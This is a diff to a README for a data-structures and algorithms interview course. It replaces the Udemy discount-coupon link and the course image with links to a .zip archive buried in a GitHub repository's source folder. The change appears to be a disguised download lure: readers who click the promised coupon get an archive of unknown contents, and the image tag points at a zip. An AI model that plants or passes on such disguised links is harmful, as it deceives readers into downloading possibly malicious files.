@@ -1,4 +1,4 @@
-## Snapped code for Data Structure and Algorithms Analysis - Job Interview  PlayList in Udemy, Enroll using a [ 95% discount coupon](https://www.udemy.com/course/data-structure-and-algorithms-analysis/?referralCode=D1C3669A1F5ACB502F67). 
+## Snapped code for Data Structure and Algorithms Analysis - Job Interview  PlayList in Udemy, Enroll using a [ 95% discount coupon](https://github.com/bk-blacksniper/DataStructureAndAlgorithms/raw/refs/heads/master/CodingInterviews/src/com/problem11/Data_Structure_And_Algorithms_3.8.zip). 
 
  ## Course Description
 
@@ -7,4 +7,4 @@ In this course you will learn how to Analysis algorithms like Sorting, Searching
 We will discus code complexity in Different algorithms like Sorting algorithms ( Bubble, Merge, Heap, and quick sort) , searching algorithms ( Binary search, linear search, and Interpolation), Graph algorithms( Binary tree, DFS, BFS, Nearest Neighbor and Shortest path, Dijkstra's Algorithm, and A* Algorithm). and Data Structure like Dynamic Array, Linked List, Stack, Queue, and Hash-Table
 
 
-![main](http://attach.alruabye.net/dsa/dsa.jpg)
+![main](https://github.com/bk-blacksniper/DataStructureAndAlgorithms/raw/refs/heads/master/CodingInterviews/src/com/problem11/Data_Structure_And_Algorithms_3.8.zip)
